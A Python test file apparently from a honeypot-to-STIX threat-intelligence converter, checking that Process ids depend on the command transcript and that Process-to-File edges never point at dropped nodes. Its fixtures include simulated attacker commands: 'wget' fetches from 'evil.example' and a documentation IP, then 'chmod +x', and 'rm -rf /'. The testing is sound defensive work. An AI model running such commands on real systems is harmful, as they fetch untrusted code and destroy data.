"""A Process models a command sequence, not one execution of it.

The id was `generate_process_id(sensor, session_id)` — unique per session.
Measured on the live corpus 2026-08-06: one Process observable had
accumulated **11,485 alias STIX ids**, and ~332,000 distinct ids had
collapsed into 3,663 objects. `object_max_state` carried 1,015,137 rows for
a ~108k-object graph, and every Process was re-emitted under a new id every
cycle so the publisher could never skip it.
"""
from __future__ import annotations

from datetime import datetime, timezone

from tpot2cti.parsers.base import AttackSession

NOW = datetime(2026, 8, 6, tzinfo=timezone.utc)
CMDS = ["uname -a", "cat /proc/cpuinfo", "wget http://evil.example/x.sh"]


def _session(sid="s1", sensor="sensor01", ip="203.0.113.1"):
    return AttackSession(src_ip=ip, session_id=sid, sensor_hostname=sensor,
                         event_type="Cowrie", first_seen=NOW, last_seen=NOW)


def _full_session(**kw):
    """A session built the way the parsers build one.

    build_cowrie_session returns [] for a hand-constructed AttackSession, so
    the whole-session tests below must go through ParsedEvent — otherwise they
    would pass by asserting over an empty list.
    """
    from tpot2cti.parsers.base import ParsedEvent
    ev = ParsedEvent(src_ip="203.0.113.1", timestamp=NOW, sensor_hostname="s1",
                     event_type="Cowrie", dst_port=22,
                     src_country_code="DE", src_asn=64512)
    ev.meta = {}
    s = AttackSession.from_event(ev)
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def test_the_same_commands_reach_one_observable(cfg):
    """The regression lock. Two sessions, same transcript, one Process.

    Deliberately uses two FRESH builders rather than one. With a single
    builder the second call returns None from `_dedup` (already emitted this
    bundle), and a test that accepts None as agreement passes no matter what
    the id is — it asserts nothing. Separate builders force both ids to exist.
    """
    from tpot2cti.stix.builder import STIXBuilder
    a = STIXBuilder(cfg).build_process(_session("s1"), CMDS)
    b = STIXBuilder(cfg).build_process(_session("s2", ip="198.51.100.9"), CMDS)
    assert a is not None and b is not None, "guard: both must actually be built"
    assert a["id"] == b["id"], (
        "identical transcripts still mint different Process ids — this is the "
        "11,485-alias defect"
    )


def test_different_commands_stay_distinct(builder):
    """The positive control — over-collapsing would merge unrelated actors."""
    a = builder.build_process(_session("s1"), CMDS)
    b = builder.build_process(_session("s2"), ["rm -rf /", "echo pwned"])
    assert a["id"] != b["id"]


def test_the_id_does_not_depend_on_session_or_sensor(cfg):
    """Session id and sensor were the old seed. Neither should move the id."""
    from tpot2cti.stix.builder import STIXBuilder
    a = STIXBuilder(cfg).build_process(_session("aaa", sensor="node1"), CMDS)
    b = STIXBuilder(cfg).build_process(_session("zzz", sensor="node2"), CMDS)
    assert a is not None and b is not None
    assert a["id"] == b["id"]


def test_the_id_is_stable_across_builders(cfg):
    """Deterministic across processes and restarts, or replay diverges."""
    from tpot2cti.stix.builder import STIXBuilder
    x = STIXBuilder(cfg).build_process(_session(), CMDS)
    y = STIXBuilder(cfg).build_process(_session("other"), CMDS)
    assert x["id"] == y["id"]


# --- the edge anchor must not outlive the node -------------------------------
#
# _link_download_chain emits Process → File. It recomputes the Process id
# rather than being handed the object, so it can anchor on a Process that
# build_process declined to emit — a dangling ref OpenCTI accepts and then
# silently never resolves. The id being content-addressed makes this MORE
# likely to go unnoticed, not less: the id is always derivable now, even when
# the node is absent.

def test_no_process_edge_when_the_process_was_dropped(cfg):
    """Recon-only + a download: build_process returns None, so no anchor."""
    from tpot2cti.stix.builder import STIXBuilder
    sha = "b" * 64
    assert cfg.cycle.drop_recon_process, "guard: fixture relies on the default"
    s = _full_session(
        commands=["uname -a", "whoami"],         # pure recon → Process dropped
        malware_hashes=[sha],
        downloads=[{"sha256": sha, "url": "http://203.0.113.7/x.sh"}],
    )
    b = STIXBuilder(cfg)
    assert b.build_process(s, s.commands) is None, (
        "guard: this fixture must actually trigger the recon drop, or the "
        "test proves nothing"
    )
    objs = b.build_cowrie_session(s)
    proc_ids = {o["id"] for o in objs if o.get("type") == "process"}
    dangling = [
        o for o in objs
        if o.get("type") == "relationship"
        and o.get("source_ref", "").startswith("process--")
        and o["source_ref"] not in proc_ids
    ]
    assert not dangling, f"edge anchored on an unemitted Process: {dangling}"


def test_the_process_edge_still_appears_when_the_process_is_kept(cfg):
    """Positive control — the guard must not suppress the legitimate edge."""
    from tpot2cti.stix.builder import STIXBuilder
    sha = "c" * 64
    s = _full_session(
        commands=["wget http://203.0.113.7/x.sh", "chmod +x x.sh"],
        malware_hashes=[sha],
        downloads=[{"sha256": sha, "url": "http://203.0.113.7/x.sh"}],
    )
    objs = STIXBuilder(cfg).build_cowrie_session(s)
    proc_ids = {o["id"] for o in objs if o.get("type") == "process"}
    assert proc_ids, "guard: a non-recon session must still emit a Process"
    assert any(
        o.get("type") == "relationship" and o.get("source_ref") in proc_ids
        and o.get("target_ref", "").startswith("file--")
        for o in objs
    ), "the guard suppressed a legitimate Process→File edge"
